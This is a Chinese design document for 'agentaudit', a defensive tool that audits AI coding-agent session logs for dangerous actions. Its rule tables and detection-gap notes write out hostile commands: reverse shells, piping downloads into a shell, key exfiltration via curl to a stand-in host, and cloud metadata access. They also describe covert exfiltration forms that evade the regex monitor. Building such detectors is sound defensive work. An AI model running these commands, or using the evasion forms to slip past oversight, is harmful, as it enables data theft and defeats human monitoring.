# agentaudit — 设计文档

- 日期：2026-09-19
- 状态：已与用户逐节确认
- 项目根目录：`D:\app\vecode`

## 1. 定位

> **npm audit 之于 Node 包，agentaudit 之于 AI 编码 Agent。**

一条命令，审计本机所有编码 Agent 历史会话中的危险行为（shell 命令、文件写入、网络请求、配置修改），输出按严重度分级的安全报告。纯本地解析、零 API 成本、零配置。

- 一句话安装：`uvx agentaudit`（或 `pipx install agentaudit`）
- 核心用户：Claude Code / Codex / Gemini CLI 的个人用户；引入 Agent 的团队的 IT/安全负责人
- 用户画像来源：项目负责人本人是 Claude Code 重度用户（自用驱动开发）

## 2. 命名

- 定名 **`agentaudit`**（2026-09-19 验证：PyPI 包名未占用；GitHub 同名项目均 <51 Star，无占位者）
- 备选：`agentguard`（PyPI 亦可用，若改名可回退）

## 3. 背景与竞品格局（2026-09-19 调研结论）

- 「会话历史查看」与「实时监控（htop for agents）」两条赛道已成红海：ccview、claude-history、claude-code-trace、agent-session-view、agenttop、agentop、claudestat、CTOP、Fleet 等 5+ 项目。
- 「Agent 安全审计」侧：现有方案为博客加固框架（prompt/hook 片段）与商业平台（Checkmarx、Backslash、Coralogix）；**本机、免费、开箱即用的 OSS 审计工具为空白**。
- 话题热点：2026-04 曝出 Claude Code deny 规则静默绕过漏洞与 3 个命令注入漏洞，安全话题正当红。

## 4. 目标与非目标

### v0.1 目标（MVP）

1. 解析 Claude Code 本地会话：`~/.claude/projects/**/*.jsonl`
2. 内置 28 条规则（5 类，见 §6）
3. 终端报告（rich 渲染）：严重度汇总 + 证据明细（命令原文、会话、项目、时间戳）+ `--json` 导出
4. Windows / macOS / Linux 三平台可用，**Windows 优先测试**（差异化：同类工具普遍缺 Windows 验证）
5. 中英双语 README

### 非目标（MVP 明确不做）

- Codex / Gemini CLI 解析（v0.2）
- 拦截/防护模式（v0.3，PreToolUse hook 策略引擎）
- HTML 报告页、CI/SARIF 集成（v0.2）
- 任何网络上报行为（本工具永不联网，写进 README 承诺）

## 5. 统一事件模型（架构核心决策）

解析层把各 Agent 的原始数据转为 4 种统一事件，规则引擎只消费统一事件。后续新增 Agent 解析器时规则引擎零改动。

```python
class Event:            # 基类
    session_id: str
    project: str        # 项目目录名
    timestamp: datetime

class ShellCommand(Event):     # 来源: Bash 工具调用
    raw: str                   # 完整命令字符串
    cwd: str | None

class FileWrite(Event):        # 来源: Edit / Write / NotebookEdit
    path: str
    is_config: bool            # 命中已知配置文件清单（settings.json、.bashrc 等）

class NetworkRequest(Event):   # 来源: WebFetch / WebSearch
    url: str
    method: str | None

class McpToolCall(Event):      # 来源: mcp__* 工具调用
    server: str
    tool: str
    args_hint: str             # 参数摘要（截断）
```

MVP 规则主要消费 ShellCommand 与 FileWrite；NetworkRequest / McpToolCall 先入模型，v0.2 扩展规则覆盖。

## 6. 规则目录（v0.1，28 条）

严重度：CRITICAL / HIGH / MEDIUM / LOW / INFO。实现时逐条调参，下表为初值。

### 🟥 D — 破坏性操作
| ID | 内容 | 严重度 |
|---|---|---|
| D001 | 递归强制删除：`rm -rf`、Windows `rd /s /q`、`Remove-Item -Recurse -Force` | CRITICAL |
| D002 | git 危险操作：`reset --hard`、`clean -fd`、`push --force`、`reflog expire` | HIGH |
| D003 | 权限放宽：`chmod 777` 等 | MEDIUM |
| D004 | 磁盘级操作：`dd`、`mkfs`、`diskutil erase`、`format` | CRITICAL |
| D005 | 容器/系统破坏：`docker system prune -a --volumes`、杀系统进程 | HIGH |

### 🔑 C — 凭证访问
| ID | 内容 | 严重度 |
|---|---|---|
| C001 | 读取环境变量文件（`.env*`） | HIGH |
| C002 | 读取密钥文件（`id_rsa`、`*.pem`、`*.key`、`serviceAccount*.json`） | HIGH |
| C003 | 访问凭证目录（`~/.aws`、`~/.ssh`、`~/.gnupg`、含 token 的 `.npmrc`） | HIGH |
| C004 | 钥匙串/密码管理器（`security find-generic-password`、`pass show`、`keyctl`） | CRITICAL |
| C005 | 浏览器敏感数据（`Login Data`、`cookies.sqlite`、Chrome User Data） | HIGH |
| C006 | 全量打印环境变量（`env`、`printenv`、`Get-ChildItem env:`） | MEDIUM |

### 📤 E — 数据外发
| ID | 内容 | 严重度 |
|---|---|---|
| E001 | 凭证内容送网络：`cat 密钥 \| curl`、`curl -d @.env`、`curl -F file=@` | CRITICAL |
| E002 | 命令替换外发：`curl $(cat .env)` | CRITICAL |
| E003 | 上传到 paste/webhook（pastebin、discord webhook、telegram bot） | CRITICAL |
| E004 | 添加/推送未知 git remote | HIGH |
| E005 | 打包项目后外发模式（zip/tar 后紧跟 curl） | MEDIUM |

### 🚪 B — 越权/持久化
| ID | 内容 | 严重度 |
|---|---|---|
| B001 | 修改 Claude Code 权限配置（settings.json 的 permissions.allow 加危险项） | CRITICAL |
| B002 | 禁用安全机制（删 hooks、改 sandbox 设置） | HIGH |
| B003 | 写 shell 配置（`.bashrc`/`.zshrc`/profile/PowerShell `$PROFILE`） | HIGH |
| B004 | 系统持久化（crontab、systemd unit、LaunchAgent、注册表 Run 键、计划任务） | CRITICAL |
| B005 | 写 SSH `authorized_keys` | CRITICAL |
| B006 | 使用 `sudo` | MEDIUM |

### ⚠️ U — 危险执行
| ID | 内容 | 严重度 |
|---|---|---|
| U001 | 管道执行下载内容：`curl \| sh`、`iwr \| iex` | CRITICAL |
| U002 | 混淆执行：`base64 -d \| sh`、eval 解码串 | HIGH |
| U003 | 访问云元数据端点（`169.254.169.254`、`metadata.google.internal`） | CRITICAL |
| U004 | 未固定来源的全局安装（从 git URL/脚本安装） | LOW |
| U005 | 反弹 shell 模式（`nc -e`、`/dev/tcp`、`socat exec`） | CRITICAL |
| U006 | 下载二进制后直接执行（chmod +x 后运行） | MEDIUM |

规则 = 一个纯函数 `(事件, 上下文) -> list[Finding]`。Finding 含：规则 ID、严重度、事件证据、解释、建议。跨命令模式（如 E005）允许规则维护会话内短程状态。

### 6.1 已知检测缺口与误报(v0.2 待办)

实现期审查发现的记录,每条附复现命令;v0.2 规则调优从这里分诊,不回溯 v0.1:

**漏报(变体未覆盖)**
- `ncat --exec /bin/sh 1.2.3.4 4444`(U005 只覆盖 nc/socat)
- `curl -T file https://x.com`(E001 只覆盖 -F/-d@ 上传)
- `aws s3 cp s3://b/.env .`(云 CLI 外发不在 E 系范围)
- `curl https://hooks.slack.com/services/...`(E003 目的地列表无 slack webhook)
- `chmod 7777 /x`(D003 保守漏报)、`chmod a+rwx /x`
- `sh -c "sudo rm x"`、`/usr/bin/sudo x`(B006 前缀类缺 `/"'`)
- `tar cf out.tar src`(D/E005 无短横线 tar 形态)、`zip -r "my proj.zip"`(引号名)

**隐蔽外发(v0.2 重点:从「命令形态」升级到「行为配对」)**

2026-09-20 实测 5 种隐蔽收集上传形态,仅 1 种命中(`-d @-` 因旗标形态被 E001 兜住,与编码无关)。正则匹配命令形态,蓄意隐蔽 = 换形态,穷举不可行;v0.2 的正解是泛化 E005 的有状态思路:

- **E006 collect→send(设计方向,优先级最高)**:捕获 Read 工具事件(当前事件模型完全没有 Read,「Agent 读了 N 个源码文件」这一最强前兆不可见),按会话累计源码读取量(文件数/字节);之后任何出站传输(curl/wget/scp/rsync/gh/任意旗标)超阈值 → HIGH。实测漏掉的 4 形态全部落网:编码混淆(`cat x.py | base64 | curl -d @-`——勿依赖 -d@ 侥幸)、`--data-binary`/`-T` 旗标变体、scp 分片慢传、`gh gist create --public` 合法渠道伪装
- **E007 URL 查询串外带**:NetworkRequest 通道检查查询串长度/熵(`?d=PGgxPnNlY3JldA…`),抓 WebFetch GET 参数外带
- **MCP 出站规则**:McpToolCall 事件已存在但零规则覆盖;upload/push/send 类 MCP 工具需规则(注意 args_hint 截断 200 字符,长载荷检测需先放宽)
- **前提改造**:解析器增加 Read→FileRead 事件(含 bytes 数);WebFetch 的完整 URL 已在 NetworkRequest.url,无需改
- **上限认知**:日志审计是扣分式而非证明式,想象力外的编码/信道仍会漏;蓄意攻击者的最终防线是 v0.3 guard(执行时拦截),事后审计负责懒 Agent 与绝大多数真实事件(真实事件多为 zip+curl 直球形态)
- `1169.254.169.254`(U003 只防右侧子域伪装,无 lookbehind)

**误报(可接受但可调优)**
- `tail -f .env.watchdog` 误中 C001(`\.env\b` 后跟 `.` 视为边界)
- `cat id_rsa.pub` 误中 C002(公钥读取)
- `cat config/production.pem.bak` 误中 C002(可接受:仍是密钥材料)
- `npm install --registry https://...` 误中 U004(LOW,可接受)
- `echo sudo x` 误中 B006(设计如此:sudo 出现即提示)
- E005 子串匹配:打包 `a.zip` 后上传 `nota.zip` 会命中

**性能约定(实现期确立,新规则必须遵守)**
- 正则中缀跨度一律 `{0,400}`(B001 allow-list 扫描 `{0,2000}`),禁止双中缀链
- 路径类必须 `\b` 前缀 + `{1,200}` 上限(C002/E005 教训:`.`/`/` 是类内非词字符,每个词→标点转移都是新回溯起点)
- 对抗基线:320KB 重复锚点输入,单规则 <500ms

## 7. 架构

```
CLI (typer + rich)
  ↓
① Discovery   定位 ~/.claude/projects/ 下所有 *.jsonl
  ↓
② Parsers     claude_code.py：流式逐行解析 → 统一事件
  ↓
③ Rules       28 条规则，逐事件流式判定 → Findings
  ↓
④ Report      终端渲染 / JSON /（后续 SARIF、share card）
```

- **流式处理**：逐行读、逐事件过规则，不在内存囤全量历史（应对 GB 级会话文件）
- **规则即数据**：规则元信息（ID/严重度/说明/文档链接）驱动报告渲染，新增规则 = 新增一个函数
- **永不中断**：任何单行解析失败只计数跳过，报告末尾汇总「跳过 N 行」

## 8. CLI 设计（v0.1）

```
agentaudit                    # 扫描默认路径，终端报告
agentaudit [path]             # 指定项目/会话文件
agentaudit --json             # JSON 输出（CI/脚本用）
agentaudit --severity high+   # 过滤严重度
agentaudit --session <id>     # 只审一个会话
agentaudit --rules D,E        # 只跑指定类别
agentaudit --list-rules       # 列出全部规则
agentaudit --demo             # 用内置合成数据演示（无需装过 Claude Code）
```

## 9. 错误处理

| 情形 | 行为 |
|---|---|
| 坏行/JSON 格式异常 | 跳过并计数，末尾汇总提示，绝不崩溃 |
| 会话文件正被 Claude Code 写入 | 只读打开（三平台安全） |
| 数据目录不存在 | 友好提示；检测常见 WSL 路径并建议 |
| 超大文件 | 流式读取 + 进度条 |
| 空会话/无发现 | 明确输出「0 发现」的正面反馈，不是错误 |

## 10. 测试策略

- pytest；各层独立单测：解析器（fixture JSONL）、规则（构造事件）、报告（渲染冒烟）
- fixture：2-3 份合成/脱敏的真实形状 JSONL，覆盖三平台命令风格（bash / PowerShell / cmd）
- 端到端：负责人本人真实历史会话冒烟（结果脱敏后同时作为发布素材）

## 11. 发布与传播

**仓库准备**：英文主 README（一句话定位 + 10 秒 GIF + 安装 + 规则表）、`README.zh-CN.md`、MIT LICENSE、CONTRIBUTING、`--demo` 模式、share card 输出（可贴推文的 ASCII 摘要）。

**节奏**：
1. r/ClaudeCode：真实审计数字帖（「审计自己 N 个月历史，发现 X 个危险操作」）
2. Show HN：「Show HN: agentaudit – npm audit for your AI coding agents」
3. X/Twitter 英文推文 + share card 截图
4. 3 天后国内：掘金 + V2EX
5. 提交 awesome-claude-code 等清单

**路线图**：
- v0.1（第 1-2 周）：MVP（§4）+ `--demo` + share card 输出（发布传播依赖这两项）
- v0.2（第 3-4 周）：Codex/Gemini CLI 解析器、SARIF 导出
- v0.3（第 5-6 周）：拦截模式（PreToolUse hook 策略引擎，audit → guard 闭环）
- 之后按 issue 反馈迭代

**成功指标**：首周 300 Star 或 30 条真实反馈 = 验证成功；首月 1k Star = 爆火线。

## 12. 技术选型

- Python 3.10+；typer（CLI）、rich（渲染）
- 打包：pyproject + uv；发布 PyPI；`uvx agentaudit` 免安装运行
- 测试：pytest；CI：GitHub Actions（三平台矩阵，Windows 必测）
